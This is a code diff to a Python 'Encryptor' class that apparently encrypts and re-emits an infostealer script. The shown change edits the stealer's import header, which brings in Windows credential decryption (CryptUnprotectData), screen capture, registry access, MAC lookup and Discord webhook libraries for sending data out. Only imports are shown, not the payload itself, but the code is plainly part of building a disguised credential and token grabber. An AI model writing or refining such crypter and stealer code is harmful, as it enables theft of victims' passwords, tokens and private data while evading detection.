@@ -24,11 +24,11 @@ class Encryptor:
             plaintext = f.read()
         enc = self.encrypt(plaintext, self.key)
         with open(self.file_name, 'w') as f:
-            f.write("""import hashlib
+            f.write("""import base64
+import codecs
 import requests
 import os
 import json
-import base64
 import winreg
 import shutil
 import psutil
@@ -40,14 +40,17 @@ import platform
 import win32crypt
 import subprocess
 import sys
+import httpx
 
-from Crypto import Random
-from Crypto.Cipher import AES
+from Cryptodome.Cipher import AES
+from subprocess import PIPE, Popen
 from win32crypt import CryptUnprotectData
 from PIL import ImageGrab
+from json import load
 from sys import argv
 from threading import Thread
 from re import findall, match
+from urllib.request import urlopen
 from discord import File, Webhook, RequestsWebhookAdapter
 from discord_webhook import DiscordWebhook, DiscordEmbed
 from getmac import get_mac_address as gma""")
